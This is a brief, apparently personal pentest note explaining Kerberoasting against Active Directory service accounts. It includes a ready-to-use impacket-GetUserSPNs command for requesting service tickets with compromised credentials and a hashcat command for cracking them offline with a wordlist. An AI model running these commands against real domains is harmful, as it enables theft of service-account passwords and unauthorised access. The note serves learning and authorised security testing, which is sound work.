Kerberoasting takes advantage of Service Accounts. It attacks step 4 of the process below.
![image](https://github.com/user-attachments/assets/1d296fb8-cf21-4b2b-9fa1-05ae2f48b7f4)
* TGT = Ticket-Granting Ticket
* TGS = Ticket-Granting Service
* SPN = Service Principal Name
Anyone with compromised credentials can request a TGT.

TGS is encrypted with the servers account hash. Thus if it is cracked, we get the password to the Service Account.
# How to do it
Get the TGS of the DC:
```bash
sudo impacket-GetUserSPNs -request -dc-ip $(DC_IP) $(DOMAIN)/$(USER)
```
Store the hash in a text file and decrypt the hash:
```bash
sudo hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
